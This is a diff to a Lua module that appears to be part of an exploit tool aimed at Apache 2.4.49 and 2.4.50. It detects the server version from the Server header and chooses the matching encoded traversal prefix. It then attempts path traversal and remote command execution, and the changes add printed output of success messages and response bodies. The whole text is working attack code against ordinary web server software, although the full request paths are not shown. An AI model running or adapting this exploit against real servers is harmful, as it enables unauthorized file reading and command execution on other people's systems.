@@ -59,6 +59,8 @@ return {
     end
 
     for w in target:gmatch("[^,]+") do
+      print(c.fg.yellow .. "Target: " .. w .. c.reset)
+
       ---@type HTTPConfig
       local cfg = {}
       cfg.url = w
@@ -81,9 +83,11 @@ return {
       local dds = ""
       if response.headers["Server"] and response.headers["Server"]:match("Apache/2.4.49") then
         explo.info("Target " .. w .. " is running Apache 2.4.49")
+        print(c.fg.yellow .. "Target " .. w .. " is running Apache 2.4.49" .. c.reset)
         dds = "/.%2e"
       elseif response.headers["Server"] and response.headers["Server"]:match("Apache/2.4.50") then
         explo.info("Target " .. w .. " is running Apache 2.4.50")
+        print(c.fg.yellow .. "Target " .. w .. " is running Apache 2.4.50" .. c.reset)
         dds = "/.%%32%65"
       else
         explo.error("Target " .. w .. " is not running Apache 2.4.49 or 2.4.50")
@@ -95,17 +99,22 @@ return {
         response, err = http.request(cfg)
         if err then
           explo.error("HTTP request failed: " .. err)
+          print(c.fg.red .. "HTTP request failed: " .. err .. c.reset)
           return
         end
         if not response then
           explo.error("No response received from " .. w)
+          print(c.fg.red .. "No response received from " .. w .. c.reset)
           return
         end
         if response.status_code == 200 then
           explo.info("Path Traversal successful on " .. w)
           explo.info("Response: " .. response.body)
+          print(c.fg.green .. "Path Traversal successful on " .. w .. c.reset)
+          print(response.body)
         else
           explo.error("Path Traversal failed on " .. w)
+          print(c.fg.red .. "Path Traversal failed on " .. w .. c.reset)
         end
       end
 
@@ -116,12 +125,14 @@ return {
         local rce_response = http.request(cfg)
         if not rce_response then
           explo.error("No response received from RCE on " .. w)
+          print(c.fg.red .. "No response received from RCE on " .. w .. c.reset)
           return
         end
         if rce_response.status_code == 200 then
           explo.info("RCE successful on " .. w)
           explo.info("Response: " .. rce_response.body)
           print(c.fg.green .. "RCE successful on " .. w .. c.reset)
+          print(rce_response.body)
         else
           explo.error("RCE failed on " .. w)
           print(c.fg.red .. "RCE failed on " .. w .. c.reset)
